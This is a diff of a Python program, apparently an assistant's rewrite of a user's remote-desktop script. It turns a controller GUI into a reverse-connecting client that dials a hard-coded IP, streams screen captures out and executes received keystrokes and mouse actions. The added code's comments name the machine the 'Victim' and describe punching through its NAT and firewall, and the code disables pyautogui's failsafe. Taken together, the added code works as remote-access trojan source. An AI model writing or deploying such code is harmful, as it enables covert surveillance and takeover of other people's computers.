@@ -1,83 +1,92 @@
 import socket
-import tkinter
-import threading
-from PIL import Image, ImageTk
-from io import BytesIO
-import mouse as mouse_lib # renamed to avoid conflict
 import keyboard
+import pyautogui
+import threading
+import time
+from PIL import ImageGrab
+from io import BytesIO
 
-class MainController:
-    def __init__(self, target_ip):
-        self.target_ip = target_ip
-        
-        # 1. Setup GUI
-        self.root = tkinter.Tk()
-        self.root.title(f"Controlling: {target_ip}")
-        self.label = tkinter.Label(self.root)
-        self.label.pack()
 
-        # 2. Setup Sockets
-        # Keyboard (TCP)
-        self.kb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Mouse (UDP)
-        self.mouse_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # Screen (UDP - Receiver)
-        self.screen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.screen_sock.bind(('0.0.0.0', 10000))
-        self.screen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1000000)
+CONTROLLER_IP = '192.168.1.142' 
+KB_PORT = 12345
+MOUSE_PORT = 12346
+SCREEN_PORT = 10000
 
-        # 3. Connect
+pyautogui.PAUSE = 0
+pyautogui.FAILSAFE = False
+
+# 1. KEYBOARD 
+def kb_client():
+    while True:
         try:
-            self.kb_sock.connect((self.target_ip, 12345))
-            print("Connected to Keyboard Server")
+            print(f"TCP: Trying to connect to Controller at {CONTROLLER_IP}...")
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((CONTROLLER_IP, KB_PORT))
+            print("TCP: Connected! Waiting for commands...")
+            
+            while True:
+                # Wait for command from Controller
+                data = sock.recv(1024).decode()
+                if not data: break
+                
+                # Execute Key Press
+                if data.startswith("k:"):
+                    key = data.split(":")[1].strip()
+                    try:
+                        keyboard.press_and_release(key)
+                    except: pass
+        except Exception as e:
+            print(f"KB Disconnected: {e}")
+            time.sleep(3) # Wait 3 seconds before trying to reconnect
+
+# 2. MOUSE (UDP Client - "Hole Punching")
+def mouse_client():
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # STEP A: Send a "Ping" packet to the Controller.
+            # This opens a "hole" in the Victim's NAT/Firewall allowing replies to come back.
+            sock.sendto(b'ping', (CONTROLLER_IP, MOUSE_PORT))
+            
+            print("UDP: Mouse Tunnel Open. Listening for movements...")
+            
+            while True:
+                # STEP B: Listen for move commands from Controller
+                data, _ = sock.recvfrom(1024)
+                msg = data.decode()
+                
+                if msg.startswith("m:"):
+                    coords = msg[2:].split(",")
+                    pyautogui.moveTo(int(coords[0]), int(coords[1]))
+                elif msg.startswith("c:"):
+                    button = msg[2:]
+                    pyautogui.click(button=button)
+                    
+        except Exception as e:
+            print(f"Mouse Error: {e}")
+            time.sleep(3)
+
+# 3. SCREEN (UDP Client - Sends TO you)
+# This was already correct in your original code!
+def screen_sender():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        try:
+            img = ImageGrab.grab().resize((800, 600))
+            buf = BytesIO()
+            img.save(buf, format="JPEG", quality=30)
+            data = buf.getvalue()
+            
+            if len(data) < 65507:
+                sock.sendto(data, (CONTROLLER_IP, SCREEN_PORT))
+            
+            time.sleep(0.05)
         except:
-            print("Keyboard Server not found!")
-
-        # 4. Start Listeners
-        self.setup_hooks()
-        threading.Thread(target=self.receive_screen, daemon=True).start()
-        
-        self.root.mainloop()
-
-    def setup_hooks(self):
-        # Keyboard Hook
-        def on_key(event):
-            if event.event_type == keyboard.KEY_DOWN:
-                try:
-                    self.kb_sock.sendall(f"k:{event.name}\n".encode())
-                except: pass
-        keyboard.hook(on_key)
-
-        # Mouse Click Hooks
-        mouse_lib.on_click(lambda: self.send_mouse("c:left"))
-        mouse_lib.on_right_click(lambda: self.send_mouse("c:right"))
-
-        # Mouse Movement (Throttle logic)
-        threading.Thread(target=self.track_mouse, daemon=True).start()
-
-    def send_mouse(self, msg):
-        self.mouse_sock.sendto(msg.encode(), (self.target_ip, 12346))
-
-    def track_mouse(self):
-        last_pos = (0, 0)
-        while True:
-            curr_pos = mouse_lib.get_position()
-            if curr_pos != last_pos:
-                self.send_mouse(f"m:{curr_pos[0]},{curr_pos[1]}")
-                last_pos = curr_pos
-            threading.Event().wait(0.01) # 100Hz updates
-
-    def receive_screen(self):
-        while True:
-            try:
-                data, _ = self.screen_sock.recvfrom(65507)
-                img = Image.open(BytesIO(data))
-                photo = ImageTk.PhotoImage(img)
-                self.label.config(image=photo)
-                self.label.image = photo
-            except:
-                continue
+            time.sleep(1)
 
 if __name__ == "__main__":
-    TARGET_IP = '192.168.1.176' # Change this to the target's IP
-    MainController(TARGET_IP)
+    # Start all threads
+    threading.Thread(target=kb_client, daemon=True).start()
+    threading.Thread(target=mouse_client, daemon=True).start()
+    screen_sender()
